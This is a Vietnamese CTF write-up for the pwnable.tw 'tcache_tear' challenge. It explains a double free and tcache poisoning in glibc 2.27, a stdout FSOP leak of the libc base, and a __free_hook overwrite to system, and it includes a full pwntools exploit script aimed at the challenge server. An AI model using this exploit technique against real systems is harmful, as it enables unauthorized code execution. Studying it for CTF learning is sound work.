+++
title = 'Pwnable.tw - tcache_tear'
date = 2025-11-07T23:01:33+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## tcache_tear

`nc chall.pwnable.tw 10207`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/tcache_tear/tcache_tear_patched
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
FORTIFY:    Enabled
```

libc đi kèm là `Ubuntu GLIBC 2.27-3ubuntu1`, có `tcache` nhưng **chưa có field `key`** (chỉ thêm từ 2.29) nên double free không bị phát hiện.

Menu 4 chức năng, binary `stripped`, các biến global:

```js
0x602020    stdout      (copy relocation, trỏ tới &_IO_2_1_stdout_)
0x602060    name        (0x20 bytes)
0x602088    ptr         (con trỏ chunk duy nhất)
```

```c
int main()
{
    printf("Name:");
    read_input(name, 0x20);
    while (1) {
        menu();
        switch (read_long()) {
            case 1: m_malloc(); break;
            case 2: m_free();   break;
            case 3: m_info();   break;
            case 4: exit(0);
        }
    }
}
```

`case 1` - malloc:

```asm
 400b43:  cmp    QWORD PTR [rbp-0x8],0xff
 400b4b:  ja     400b96                       ; size <= 0xff
 400b54:  call   400810 <malloc@plt>
 400b59:  mov    QWORD PTR [rip+0x201528],rax ; ptr = malloc(size)
 400b71:  mov    rax,QWORD PTR [rbp-0x8]
 400b75:  lea    edx,[rax-0x10]               ; size - 0x10
 400b84:  call   400a25 <read_input>          ; read_input(ptr, size - 0x10)
```

`case 2` - free:

```asm
 400c44:  cmp    DWORD PTR [rbp-0x4],0x7
 400c48:  ja     400c83                       ; tối đa 8 lần free
 400c4a:  mov    rax,QWORD PTR [rip+0x201437]
 400c54:  call   400770 <free@plt>            ; free(ptr)
 400c59:  add    DWORD PTR [rbp-0x4],0x1
```

`case 3` - info:

```asm
 400bb3:  lea    rsi,[rip+0x2014a6]           ; name
 400bba:  mov    edi,0x1
 400bbf:  call   4007b0 <write@plt>           ; write(1, name, 0x20)
```

#### Double Free

`free(ptr)` xong không set `ptr = NULL`, cũng không có mảng quản lý nào để kiểm tra. Cộng với libc 2.27 chưa có `tcache key`, ta free cùng một chunk bao nhiêu lần cũng được (tối đa 8 lần theo counter).

#### Tcache Poisoning

Trong glibc 2.27, `__libc_malloc` kiểm tra tcache như sau:

```c
if (tc_idx < mp_.tcache_bins
    && tcache
    && tcache->entries[tc_idx] != NULL)
  {
    return tcache_get (tc_idx);
  }
```

Điều kiện là `entries[tc_idx] != NULL`, **không phải** `counts[tc_idx] > 0` (bản 2.29 mới đổi sang check `counts`). Đây là chi tiết quyết định cả chain bên dưới: kể cả khi `counts` đã về `0`, chỉ cần `entries` còn khác `NULL` thì `malloc` vẫn lấy từ tcache và đi theo `next` mà ta kiểm soát.

Không có size check trên đường tcache nên `malloc` trả về đúng địa chỉ ta đặt vào `next`, kể cả địa chỉ nằm trong `.bss` hay trong libc.

### 2. Khai thác

#### Leak libc bằng FSOP trên stdout

Trình tự với size `0x80` (chunk `0x90`):

```py
create(0x80, b'A'*8)            # 1. chunk A từ top
free()                          # 2. entries = A, A->next = NULL, counts = 1
free()                          # 3. entries = A, A->next = A,    counts = 2
create(0x80, p64(stdout))       # 4. trả A, entries = A; ghi A->next = 0x602020
create(0x80, b'B'*8)            # 5. trả A, entries = 0x602020,   counts = 0
create(0x80, b'\x60')           # 6. trả 0x602020, entries = *(0x602020) = &_IO_2_1_stdout_
create(0x80, p64(0x0fbad1800) + 3*p64(0) + b'\x00')   # 7. trả &_IO_2_1_stdout_
```

Bước 6 là chỗ hay nhất của bài. `malloc` trả về `0x602020` - chính biến `stdout` trong `.bss` - và `tcache_get` lúc đó đọc `*(0x602020)` làm head mới, nên `entries` thành `&_IO_2_1_stdout_` trong libc. Dữ liệu ghi vào chỉ 1 byte là `\x60`, trùng y hệt byte thấp cũ của con trỏ (`_IO_2_1_stdout_` ở `libc + 0x3ec760`), nên `stdout` vẫn trỏ đúng chỗ, không hỏng gì. Nó chỉ tồn tại để "tiêu thụ" entry `0x602020` và nhận head mới.

Bước 7 do đó `malloc` trả về thẳng `&_IO_2_1_stdout_`, ta ghi vào struct `_IO_FILE`:

```js
_flags         = 0xfbad1800
_IO_read_ptr   = 0
_IO_read_end   = 0
_IO_read_base  = 0
_IO_write_base = ...00      (ghi 1 byte 0x00 vào byte thấp)
```

Xoá byte thấp của `_IO_write_base` kéo nó lùi về `libc + 0x3ec700`, trong khi `_IO_write_ptr` vẫn ở chỗ cũ. Lần flush tiếp theo `puts`/`printf` sẽ in toàn bộ vùng từ `write_base` tới `write_ptr` - tức là dump luôn phần cuối struct `_IO_2_1_stderr_` nằm ngay trước đó.

```py
r(8)
leak = u64(r(8))
libc.address = leak - libc.sym._IO_stdfile_2_lock
```

8 bytes thứ hai của phần dump là `stderr->_lock`, trỏ tới `_IO_stdfile_2_lock`, nên trừ ra được `libc base`.

#### Overwrite `__free_hook`

Lặp lại đúng pattern đó với size `0x40`:

```py
create(0x40, b'C'*8)
free()
free()
create(0x40, p64(libc.sym.__free_hook))
create(0x40, b'D'*8)
create(0x40, p64(libc.sym.system))      # malloc trả về __free_hook
create(0x40, b'/bin/sh\x00')
free()                                  # free(ptr) -> system("/bin/sh")
```

Lần này sau khi ghi `system` vào `__free_hook` thì `entries` nhận giá trị cũ ở `__free_hook` là `0` → head về `NULL`, tcache sạch, nên `create` kế tiếp lấy chunk mới từ top để chứa `/bin/sh`. `free()` cuối cùng gọi `__free_hook(ptr)` = `system("/bin/sh")`.

Tổng cộng dùng 5 lần `free`, còn trong giới hạn 8.

Chạy local:

```bash
(pwn) ➜ lwd3c@Lenovo-LOQ-15IRH8  ~/Desktop/Pwn/pwnable.tw/tcache_tear  ./exploit.py
[+] Starting local process '/home/lwd3c/Desktop/Pwn/pwnable.tw/tcache_tear/tcache_tear_patched': pid 151186
[*] leak: 0x7a1b3afed8b0
[*] libc.address: 0x7a1b3ac00000
[*] Switching to interactive mode
cat: /home/tcache_tear/flag
```

`libc base` ra tròn trang và `cat` chạy được, tức shell đã lên. Sau đó bắn remote.

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('tcache_tear_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)

def GDB():
    gdb.attach(p, gdbscript="""
        b* 0x400c11
    """)

if args.REMOTE:
    p = remote("chall.pwnable.tw", int("10207"))
else:
    p = process([exe.path])
    if args.GDB:
        GDB()

name = 0x602060
ptr = 0x602088
stdout = 0x602020

sla(b'Name:', b'duc')

def create(size, data):
    slna(b'choice :', 1)
    slna(b'Size:', size)
    sa(b'Data:', data)

def free():
    slna(b'choice :', 2)

def show():
    slna(b'choice :', 3)

# Leak libc base address using stdout
create(0x80, b'A'*8)
free()
free()
create(0x80, p64(stdout))
create(0x80, b'B'*8)
create(0x80, b'\x60')
create(0x80,  p64(0x0fbad1800)+ 3*p64(0) + b'\x00')

# Read leak
r(8)
leak = u64(r(8))
info(f'leak: {hex(leak)}')
libc.address = leak - libc.sym._IO_stdfile_2_lock
info(f'libc.address: {hex(libc.address)}')

# Overwrite __free_hook with system
create(0x40, b'C'*8)
free()
free()
create(0x40, p64(libc.sym.__free_hook))
create(0x40, b'D'*8)
create(0x40, p64(libc.sym.system))
create(0x40, b'/bin/sh\x00')
free()

sl('cat /home/tcache_tear/flag')

p.interactive()
```
